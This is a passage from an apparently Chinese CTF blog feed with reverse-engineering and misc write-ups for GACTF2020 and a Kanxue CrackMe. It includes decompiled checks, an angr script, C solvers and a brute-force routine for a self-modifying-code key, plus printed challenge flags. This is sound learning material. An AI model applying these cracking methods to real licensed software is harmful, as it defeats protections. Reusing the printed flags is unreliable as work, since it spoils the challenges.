class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">301</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">10</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">11</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">12</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">187</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">13</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">8</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">14</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">15</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">16</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">314</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">17</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">353</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">18</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">87</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">19</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">288</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">20</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">21</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">22</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">23</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">181</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">24</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">275</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">25</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">160</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">26</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">289</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">27</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">28</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">11</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">29</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">30</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">371</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">31</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">70</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>从上面打印出的执行，整个程序就很清楚了。</p><p>首先就是逆出输入的第一个整型数据，但看了下算法，确实麻烦。。正好之前学习了下angr符号执行，用这个题尝试一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, claripy, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'flag:'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_false</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'错误信息'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">'EasyRe'</span>) <span class="comment">#代表程序的“初始化映像”</span></span><br><span class="line">init_state = proj.factory.entry_state() <span class="comment">#表示模拟从程序的入口点开始的状态</span></span><br><span class="line">good_addr = <span class="number">0x08048BE0</span> </span><br><span class="line">bad_addr = <span class="number">0x08048BF1</span></span><br><span class="line">sim = proj.factory.simgr(init_state) <span class="comment">#申明state的模拟管理器sim来用于执行模拟的程序</span></span><br><span class="line">sim.explore(find = is_success) <span class="comment">#模拟程序的执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>): <span class="comment">#打印出标准输入，输出，错误输出。</span></span><br><span class="line">print(sim.found[<span class="number">0</span>].posix.dumps(i))</span><br></pre></td></tr></table></figure><p><img src="/2020/08/30/GACTF2020/image-20200913202220431.png" alt="image-20200913202220431"></p><p>很快得到了答案，尝试输入一下，正确。<img src="/2020/08/30/GACTF2020/image-20200913200733625.png" alt="image-20200913200733625"></p><p>开始使用这个整型数据计算出dword_804B2A0数组中的4个值。</p><p>刚刚计算完准备依次逆出flag中的每一位时就想到，其实可以不用计算第一个输入的整型数据，因为给了flag的格式为GACTF。。。根据这个就可以计算出dword_804B2A0数组中的每一位。。</p><p>开始利用之前复制到C语言编译器中的代码打印出flag中每一位与dword_804B2A0[]数组异或的是哪一位，与最后需要用来比较的数据。</p><p>最后算一下，得到flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">267</span>, <span class="number">122</span>, <span class="number">149</span>, <span class="number">262</span>, <span class="number">125</span>, <span class="number">173</span>, <span class="number">303</span>, <span class="number">357</span>,</span><br><span class="line"><span class="number">301</span>, <span class="number">303</span>, <span class="number">313</span>, <span class="number">269</span>, <span class="number">187</span>, <span class="number">8</span>, <span class="number">269</span>, <span class="number">319</span>, </span><br><span class="line"><span class="number">314</span>, <span class="number">353</span>, <span class="number">87</span>, <span class="number">288</span>, <span class="number">269</span>, <span class="number">319</span>, <span class="number">319</span>, <span class="number">181</span>,</span><br><span class="line"><span class="number">275</span>, <span class="number">160</span>, <span class="number">289</span>, <span class="number">269</span>, <span class="number">11</span>, <span class="number">313</span>, <span class="number">371</span>, <span class="number">70</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> b[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">s[<span class="number">0</span>] = <span class="string">'G'</span> ^ a[<span class="number">0</span>];</span><br><span class="line">s[<span class="number">1</span>] = <span class="string">'A'</span> ^ a[<span class="number">1</span>];</span><br><span class="line">s[<span class="number">2</span>] = <span class="string">'T'</span> ^ a[<span class="number">3</span>];</span><br><span class="line">s[<span class="number">3</span>] = <span class="string">'C'</span> ^ a[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">flag[i] = a[i] ^ s[b[i]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GACTF&#123;c7ack_m3_sh3ll_smc_vm_0k?&#125;</span></span><br></pre></td></tr></table></figure><p>其实也是很简单的一个题，利用flag的格式。。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SignIN"><a href="#SignIN" class="headerlink" title="SignIN"></a>SignIN</h3><p>将二维码拼接一下，扫出flag。</p><p><img src="/2020/08/30/GACTF2020/image-20200913201331681.png" alt="image-20200913201331681"></p><p><strong>welc0me_t0_GACTF_have_Fun</strong></p><h3 id="crymisc"><a href="#crymisc" class="headerlink" title="crymisc"></a>crymisc</h3><p>一个word文档，但是打不开。拖进010editor查看，发现<strong>504B(PK)</strong>，是一个压缩包。</p><p>改文件后缀后其中一个文件解压失败。</p><p><img src="/2020/08/30/GACTF2020/image-20200913202250211.png" alt="image-20200913202250211"></p><p>谷歌看见可以使用winrar来修复一下。</p><p>下载后，在winrar中打开却是提示有密码。。那就猜测是伪加密了。。下面修改为偶数即可。<img src="/2020/08/30/GACTF2020/image-20200913203212543.png" alt="image-20200913203212543"></p><p>360压缩还是奇妙，伪加密文件直接提示文件出错。。</p><p>然后打开一张图片和一个文本文件。文本文件没有什么，查看图片二进制信息。在最后发现：<img src="/2020/08/30/GACTF2020/image-20200913203442903.png" alt="image-20200913203442903"></p><p>又是一个压缩包，但在开头出现一个字符串，从组成猜测是base64加密。解密得到：<img src="/2020/08/30/GACTF2020/image-20200913203556733.png" alt="image-20200913203556733"></p><p>看来是后面压缩包的密码。然后把该压缩包的头补全（<strong>504b</strong>），输入密码解压：<img src="/2020/08/30/GACTF2020/image-20200913203858388.png" alt="image-20200913203858388"></p><p>到这一步就一直卡住了。。。实在没见过这个表情密码，谷歌百度查到的信息又不会用，，，</p><p>比赛完了才从一位师傅哪里知道要自己从github找到这个项目自己搭建一下环境，然后根据一张表映射关系解密。。。</p><p>根据师傅的指导搭建完后，从题目也很容易想到解密的key是哭脸表情。</p><p>最后解密：<img src="/2020/08/30/GACTF2020/image-20200913204636657.png" alt="image-20200913204636657"></p><p>还有一个坑就是，下面的表情其实是同一个，我还纠结半天。。<img src="/2020/08/30/GACTF2020/image-20200913204805711.png" alt="image-20200913204805711"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做了2个逆向及杂项还是有收获。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>CrackMe</title>
    <link href="https://www.bxnop.cn/2020/07/31/CrackMe/"/>
    <id>https://www.bxnop.cn/2020/07/31/CrackMe/</id>
    <published>2020-07-31T06:53:57.000Z</published>
    <updated>2020-08-13T06:57:57.844Z</updated>
    
    <content type="html"><![CDATA[<p>本帖主要对练习Crackme的知识点与突破点进行记录。<a id="more"></a></p><h2 id="翩若惊鸿"><a href="#翩若惊鸿" class="headerlink" title="翩若惊鸿"></a>翩若惊鸿</h2><p>——题目来自看雪题库</p><p>无壳，窗口程序，随便输入一个name与key看程序的反馈。</p><p>有错误提示框，载入OD搜索相应的API，只是很多API序号，应该是MFC42库序号导出的函数。<img src="/2020/07/31/CrackMe/image-20200813120443310.png" alt="image-20200813120443310"></p><p>那现在搜索字符串看看，或使用一个下断点的插件下断，然后查看调用堆栈信息找到API。这里2种方法均可。<img src="/2020/07/31/CrackMe/image-20200813121018755.png" alt="image-20200813121018755"></p><p>向上回溯：<img src="/2020/07/31/CrackMe/image-20200813125708215.png" alt="image-20200813125708215"></p><p>开始在OD中跟进<strong>004015E0</strong>函数，但很多MFC42中导出的函数，跟起来实在恼火。。还是结合ida的F5大法来看：</p><p>一开始逆向分析算法就发现了问题：<img src="/2020/07/31/CrackMe/image-20200813133718116.png" alt="image-20200813133718116"></p><p>上面说明是个死胡同，这里就可以猜测是上面有对函数对402010处代码进行了重写。看前面的代码，果不其然：用了我们输入key的前4位来重写402010处代码，且最后一个校验（检测重写的代码是否正确），校验通过才将重写的代码拷贝到原地址处（0x402010）。<img src="/2020/07/31/CrackMe/image-20200813134136959.png" alt="image-20200813134136959"></p><p>看了看重写与校验的代码，都不复杂，大多数可以直接复制到编译器来作为一个函数使用进而爆破出正确的重写的代码，也就是得到key的前4位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hash_table[<span class="number">0x401</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401500</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; </span><br><span class="line">  <span class="keyword">int</span> *v2; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; </span><br><span class="line"></span><br><span class="line">  hash_table[<span class="number">0x400</span>] = <span class="number">1</span>;</span><br><span class="line">  v0 = <span class="number">0x0EDB88320</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = hash_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v2 = v1;</span><br><span class="line">    result = v1;</span><br><span class="line">    v4 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = ((result &amp; <span class="number">1</span>) != <span class="number">0</span> ? v0 : <span class="number">0</span>) ^ (result &gt;&gt; <span class="number">1</span>);</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 );</span><br><span class="line">    *v2 = result;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 &lt; <span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode_code</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  a3 ^= <span class="number">0xD9EE7A1B</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(result + a1) ^= *((<span class="keyword">char</span> *)&amp;a3 + (result &amp; <span class="number">3</span>));</span><br><span class="line">      ++result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401550</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; </span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = ~a1; v3 &lt; a3; ++v3 )</span><br><span class="line">    i = hash_table[(<span class="keyword">unsigned</span> __int8)i ^ *(<span class="keyword">unsigned</span> __int8 *)(v3 + a2)] ^ (i &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> ~i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] = &#123;<span class="number">0x402010</span><span class="number">-0x402AC0</span>的数据&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0x30303030</span>, e = <span class="number">0x7a7a7a7a</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> decode_data[<span class="number">0xAB0</span>];</span><br><span class="line"><span class="keyword">clock_t</span> start, <span class="built_in">end</span>, total;</span><br><span class="line"> </span><br><span class="line">start = clock();</span><br><span class="line">sub_401500();</span><br><span class="line"><span class="keyword">for</span>(i = s; i &lt;= e; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)&amp;i;</span><br><span class="line"><span class="keyword">if</span>(a[<span class="number">0</span>] &lt; <span class="number">48</span> || a[<span class="number">1</span>] &lt; <span class="number">48</span> || a[<span class="number">2</span>] &lt; <span class="number">48</span> || a[<span class="number">3</span>] &lt; <span class="number">48</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">65</span>) || (a[<span class="number">1</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">65</span>) || </span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">65</span>) || (a[<span class="number">3</span>] &gt; <span 